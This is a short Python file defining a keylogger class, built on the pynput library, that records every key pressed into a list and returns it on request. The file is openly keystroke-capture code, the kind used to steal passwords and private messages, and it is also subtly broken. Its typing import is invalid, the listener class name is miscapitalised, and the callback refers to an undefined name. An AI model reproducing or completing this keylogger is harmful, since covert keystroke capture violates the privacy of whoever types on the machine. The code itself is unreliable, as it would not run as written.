from abc import ABC
from typing import list
from pynput import keyboard

class Ikeylogger(ABC):
    def __init__(self):
        self.listener=keyboard.listener(on_press=_data_logger)
        self.data=[]

    def _data_logger(self,key):
        self.data.append(key)

    def start_logging(self):
        self.listener.start()

    def stop_logging(self):
        self.listener.stop()

    def get_logged_keys(self):
        return self.data




